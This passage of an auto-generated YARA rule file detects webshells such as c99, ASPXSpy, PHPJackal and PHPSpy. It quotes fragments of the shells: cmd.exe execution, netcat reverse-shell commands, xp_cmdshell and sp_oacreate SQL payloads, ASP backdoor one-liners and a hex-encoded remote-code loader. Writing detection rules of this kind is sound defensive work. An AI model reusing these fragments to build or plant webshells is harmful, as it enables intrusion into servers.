      $s15 = "    private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s16 = "\\\" bgcolor=\\\"#c0c0c0\\\"><a href=\\\"\"+cmd+\"&sort=3\\\">" fullword ascii
      $s17 = "\\\" bgcolor=\\\"#c0c0c0\\\"><a href=\\\"\"+cmd+\"&sort=1\\\">" fullword ascii
      $s18 = "<%@ page import=\"java.util.*,java.net.*,java.text.*,java.util.zip.*,java.io.*\"%>" fullword ascii
      $s19 = "        .login { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666; width:320px; }" fullword ascii
      $s20 = "\\\" bgcolor=\\\"#c0c0c0\\\"><a href=\\\"\"+cmd+\"&sort=2\\\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      8 of them
}

rule Jsp {
   meta:
      description = "webshell - file Jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
   strings:
      $x1 = "  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = " Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = "  /** Convenience method to read HTTP header lines */" fullword ascii
      $s4 = "  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s5 = " String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s6 = "\",\"Execute\"};" fullword ascii
      $s7 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s8 = "<br>Any question, please email me admin@syue.com" fullword ascii
      $s9 = " </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.7jyewu.cn </font>\"};" fullword ascii
      $s10 = "<center><a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a> ,All Rights Reserved." fullword ascii
      $s11 = "<a href=\"http://www.7jyewu.cn\" target=\"_blank\">http://www.7jyewu.cn/</a></b>" fullword ascii
      $s12 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
      $s13 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s14 = "  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s15 = "        line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s16 = "      line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s17 = "  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s18 = " return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s19 = "  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s20 = " int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_suiyue {
   meta:
      description = "webshell - file suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $x1 = "  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = " Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s3 = " </font>\",\" <font color=red> Thanks for your support - - by Syue http://www.syue.com </font>\"};" fullword ascii
      $s4 = "<center><a href=\"http://www.syue.com\" target=\"_blank\">" fullword ascii
      $s5 = "<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
      $s6 = "  /** Convenience method to read HTTP header lines */" fullword ascii
      $s7 = "  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir," fullword ascii
      $s8 = " String bound = request.getContentType().substring(bstart + 8);" fullword ascii
      $s9 = "\",\"Execute\"};" fullword ascii
      $s10 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s11 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
      $s12 = "  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsoluteP" ascii
      $s13 = "  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s14 = "        line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s15 = "      line = getLine(is); // Skip \"Content-Type:\" line" fullword ascii
      $s16 = "  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s17 = " return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
      $s18 = "  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
      $s19 = " int bstart = request.getContentType().lastIndexOf(\"oundary=\");" fullword ascii
      $s20 = " if (ht.get(\"cqqUploadFile\") != null)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_error52 {
   meta:
      description = "webshell - file error52.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d35705e4b8aca8e231d68ce90a1453aa184bdeaa5eaf6949165fbf20832723f8"
   strings:
      $s1 = "$GLOBALS[$GLOBALS['a1f44'][4].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][9].$GLOBALS['a" ascii
      $s2 = "1f44'][0].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][0]] = $_POST;" fullword ascii
      $s3 = "1f44'][46]] = $_COOKIE;" fullword ascii
      $s4 = "6].$GLOBALS['a1f44'][74]]($j48a7bce7) && $gfb379b<$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GL" ascii
      $s5 = "if (isset($h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]]) && $xd94==$h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]]" ascii
      $s6 = "if (isset($h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]]) && $xd94==$h708c90[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][73]]" ascii
      $s7 = "$GLOBALS[$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][13].$GLOBALS['a1f44'][53].$GLOBALS['a" ascii
      $s8 = "$GLOBALS[$GLOBALS['a1f44'][47].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][11].$GLOBALS['a1f44'][53].$GLOBALS['a1f44'][32].$GLOBALS[" ascii
      $s9 = "S['a1f44'][24].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][87].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][79].$GL" ascii
      $s10 = "$GLOBALS[$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][11].$GLOBALS[" ascii
      $s11 = "$GLOBALS[$GLOBALS['a1f44'][33].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][74]] = $GLOBA" ascii
      $s12 = "47].$GLOBALS['a1f44'][61], 0);" fullword ascii
      $s13 = "$GLOBALS[$GLOBALS['a1f44'][57].$GLOBALS['a1f44'][0].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][43]] = $GLOBAL" ascii
      $s14 = "@$GLOBALS[$GLOBALS['a1f44'][39].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][43].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][32].$GLOBALS" ascii
      $s15 = "BALS['a1f44'][58].$GLOBALS['a1f44'][79].$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][12], NULL);" fullword ascii
      $s16 = ".$GLOBALS['a1f44'][61];" fullword ascii
      $s17 = "$GLOBALS['a1f44'][25].$GLOBALS['a1f44'][63].$GLOBALS['a1f44'][58].$GLOBALS['a1f44'][90].$GLOBALS['a1f44'][96].$GLOBALS['a1f44'][" ascii
      $s18 = "OBALS['a1f44'][61].$GLOBALS['a1f44'][90];" fullword ascii
      $s19 = "][53].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][20].$GLOBALS['a1f44'][93].$GLOBALS['a1f44'][88].$GLOBALS['a1f44'][39].$GLOBALS['a1" ascii
      $s20 = "f44'][32].$GLOBALS['a1f44'][46].$GLOBALS['a1f44'][61].$GLOBALS['a1f44'][32].$GLOBALS['a1f44'][74].$GLOBALS['a1f44'][88];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule webshell_php_c99v2 {
   meta:
      description = "webshell - file c99v2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
   strings:
      $x1 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x3 = "t=\"en-us\"><link rel=\"shortcut icon\" href=\"\" type=\"image/x-icon\"></SCRIPT><title><?php echo getenv(\"HTTP_HOST\"); ?> - c" ascii
      $x4 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s5 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $s6 = "  if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $s7 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $s8 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=acco" ascii
      $s9 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=acco" ascii
      $s10 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s11 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s12 = "  ?><b>Binding port:</b><br><form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"bind\"><input type=\"hidden\" name" ascii
      $s13 = "*  c99shell - Shellci.biz" fullword ascii
      $s14 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $s15 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s16 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s17 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s18 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>act=cmd\" method=\"PO" ascii
      $s19 = " echo \"<form action=\\\"\".$surl.\"act=cmd\\\" method=\\\"POST\\\"><textarea name=\\\"cmd\\\" cols=\\\"122\\\" rows=\\\"10\\\">" ascii
      $s20 = "     echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with lo" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_itsec {
   meta:
      description = "webshell - file itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $x1 = "shell >>>>>><br>Ip Address : <input name=ipcb value=\".$_SERVER['REMOTE_ADDR'] .\"> Port : <input name=portbc value=5555><br><in" ascii
      $x2 = "echo $head.$formp.\"<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr>" ascii
      $x3 = "echo $head.'<p align=\"center\"><textarea rows=\"13\" name=\"showbsd\" cols=\"77\">';if($_POST['byws']){passthru(\"\\\\\".$_POST" ascii
      $x4 = "echo $head.$formp.\"<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable Firewall !!! )<br><hr>" ascii
      $x5 = "echo $head.'<p align=\"center\"><textarea rows=\"13\" name=\"showbsd\" cols=\"77\">';if($_POST['byws']){passthru(\"\\\\\".$_POST" ascii
      $s6 = "</a> -- <a href=\"?do=dump&address='.getcwd().'\">" fullword ascii
      $s7 = ").'<br><a href=\"http://www.itsecteam.com\" target=\"_blank\"><font size=1>'.base64_decode(\"aVRTZWNUZWFtLmNvbQ==\").'</a></font" ascii
      $s8 = "$end='</td></tr></tbody></table></div></td></tr><tr><td bgcolor=\"#c6c6c6\"><p style=\"margin-top: 0pt; margin-bottom: 0pt\" ali" ascii
      $s9 = "nput type=submit value =\"eXecute\"><input type=hidden name=do value=\"bypassdir\"></form></td></tr></table><hr>Bypass /Etc/Pass" ascii
      $s10 = "t type=submit value=Connect></form>\".$formp.\"<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Dis" ascii
      $s11 = "pe=submit value=Connect></form>\".$formp.\"<p align='center'>Usage : Run Netcat In Your Machin And Execute This Command( Disable" ascii
      $s12 = "ws size=50><input type=submit value =\"eXecute\"><input type=hidden name=do value=\"bypasscmd\"></form></td></tr></table>'.$end;" ascii
      $s13 = "<a href=\"?do=bypasscmd&address='.getcwd().'\">BypasS " fullword ascii
      $s14 = "0\"><input name=bycw size=50><input type=submit value =\"eXecute\"></form></td></tr></table>Bypass Safe_Mode Windows Server<br><" ascii
      $s15 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<br>Server Name : \".$_SERVER['HTTP_HOST'].\"<br>D" ascii
      $s16 = "td><td width=\"750\"><input name=byfc size=50><input type=submit value =\"eXecute\"><input type=hidden name=do value=\"bypassdir" ascii
      $s17 = "/itsecteam_shell.htm'>ITSecTeam Shell</a><br>Forum : <a href='http://www.forum.itsecteam.com'>http://www.forum.itsecteam.com</a>" ascii
      $s18 = "</a> -- <a href=\"?do=cmd&address='.getcwd().'\">" fullword ascii
      $s19 = "$bopens=\"Bypass Succesfull Plz Read File Peji.txt In This Folder\";" fullword ascii
      $s20 = "<td width=\"750\" style=\"border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #8080" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule PHPJackal {
   meta:
      description = "webshell - file PHPJackal.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "27c9cc91bc0a23939e526012b8b3355b8e1d2c460286595452cd2b7d750f9a16"
   strings:
      $x1 = "$alias=\"<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250" ascii
      $x2 = "$exec=$ws->exec (\"cmd.exe /c $command\"); " fullword ascii
      $x3 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x4 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x5 = "echo \"$t name=security><td>Security scanner:</td></tr><td width='25%' bgcolor='#808080'>From:</td><td bgcolor='#808080' width=8" ascii
      $x6 = "}else echo \"<center><form method='POST' name=form>${t}HTTP Auth cracker:</td><td bgcolor='#333333'><select name=method><option " ascii
      $x7 = "win_shell_execute('cmd.exe','',\"/C $command >\\\"$name\\\"\");" fullword ascii
      $x8 = "$intro=\"<center><table border=0 style='border-collapse: collapse'><tr><td bgcolor='#666666'><b>Script:</b><br>\".str_repeat('-=" ascii
      $x9 = "$crack=\"</td><td bgcolor='#333333'></td></tr><form method='POST' name=form><tr><td width='20%' bgcolor='#666666'>Dictionary:</t" ascii
      $x10 = "else echo \"<center><table border=0 style='border-collapse: collapse' width='434'><tr><td width='174' bgcolor='#333333'>HTTP For" ascii
      $x11 = "$alias=\"<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value" ascii
      $x12 = "echo \"<center>${t}Use PHP Bugs:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>F" ascii
      $x13 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php echo hlinK(\"seC=sysinfo&workingdiR=$cwd\");?>\">[Info]<" ascii
      $x14 = "logged in users</option><option value='which wget curl lynx w3m'>Downloaders</option><option value='find / -perm -2 -type d -pri" ascii
      $x15 = "$cmd=(empty($_SERVER['ComSpec']))?'d:\\\\windows\\\\system32\\\\cmd.exe':$_SERVER['ComSpec'];" fullword ascii
      $x16 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $x17 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666" ascii
      $x18 = "$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','s" ascii
      $s19 = "if(ftp_login($ftp,$user,$pass)){$output=1;echo \"$ip) FTP FOUND: ($user:$pass) System type: \".ftp_systype($ftp).\" (<b><a href=" ascii
      $s20 = "if(is_readable('/etc/passwd'))echo \"<a href='\".hlinK(\"seC=edit&filE=/etc/passwd&workingdiR=$cwd\").\"'>Readable</a>\";else ec" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule bypass_waf_2015_06_10_01 {
   meta:
      description = "webshell - file bypass-waf-2015-06-10-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1ecf4efa9911315e17df3b5184b26e46170eb705ea781282f896e5f2d5e63c0f"
   strings:
      $s1 = "$file = sprintf('%s_%s_%s',F,F1,F2); //file_get_contents " fullword ascii
      $s2 = "call_user_func(create_function(null,pack('H*',file_get_contents(pack('H*',join(null,$t))))));" fullword ascii
      $s3 = "$call = sprintf('%s_%s_%s',A,B,C); //call_user_func" fullword ascii
      $s4 = "define('F1','get');" fullword ascii
      $s5 = "define('F2','contents');" fullword ascii
      $s6 = "define('B','user');" fullword ascii
      $s7 = "$create = sprintf('%s_%s',D,E);    //create_function" fullword ascii
      $s8 = "define('P','pack');" fullword ascii
      $s9 = "define('iphp','oday');" fullword ascii
      $s10 = "define('T','H*');" fullword ascii
      $s11 = "define('E','function');" fullword ascii
      $s12 = "$t = array('6','8','7','4','7','4','7','0','3','a','2','f','2','f','6','4','6','f','6','4','6','f','6','4','6','f','6','d','6','" ascii
      $s13 = "define('F','file');" fullword ascii
      $s14 = "$t = array('6','8','7','4','7','4','7','0','3','a','2','f','2','f','6','4','6','f','6','4','6','f','6','4','6','f','6','d','6','" ascii
      $s15 = "define('C','func');" fullword ascii
      $s16 = "define('D','create');" fullword ascii
      $s17 = "$p = P;  //pack" fullword ascii
      $s18 = "4','6','3','6','f','6','4','6','5','2','e','7','0','6','8','7','0','3','f','6','3','6','1','6','c','6','c','3','d','6','3','6','" ascii
      $s19 = "f','6','4','6','5');" fullword ascii
      $s20 = "5','2','e','7','3','6','9','6','e','6','1','6','1','7','0','7','0','2','e','6','3','6','f','6','d','2','f','6','7','6','5','7','" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_2009lite {
   meta:
      description = "webshell - file 2009lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $s4 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s5 = "echo(execute($command));" fullword ascii
      $s6 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s7 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s8 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s9 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s10 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s11 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s12 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s13 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s14 = "if ($execfunc=='wscript' && IS_WIN && IS_COM) {" fullword ascii
      $s15 = "} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {" fullword ascii
      $s16 = "function execute($cfe) {" fullword ascii
      $s17 = "22 => array('max_execution_time',getcfg('max_execution_time').' second(s)')," fullword ascii
      $s18 = "r: 2009 Build 20081222</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" ascii
      $s19 = "m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'))" ascii
      $s20 = "m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'))" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ASPXspy2 {
   meta:
      description = "webshell - file ASPXspy2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x3 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $x4 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x5 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x6 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
      $x7 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x8 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x9 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $x10 = " echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @o" ascii
      $x11 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $x12 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
      $x13 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
      $x14 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
      $x15 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
      $s16 = " <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s17 = "<asp:LinkButton ID=\"UtkN\" runat=\"server\" OnClick=\"YKpI\" Text=\"Logout\" ></asp:LinkButton> | <asp:LinkButton ID=\"RsqhW\" " ascii
      $s18 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s19 = "Bin_H2_Title.InnerText=\"Execute Command >>\";" fullword ascii
      $s20 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownLis" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and all of them
}

rule webshell_aspx_aspx {
   meta:
      description = "webshell - file aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x3 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $x4 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x5 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x6 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
      $x7 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x8 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x9 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $x10 = " echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @o" ascii
      $x11 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $x12 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
      $x13 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
      $x14 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
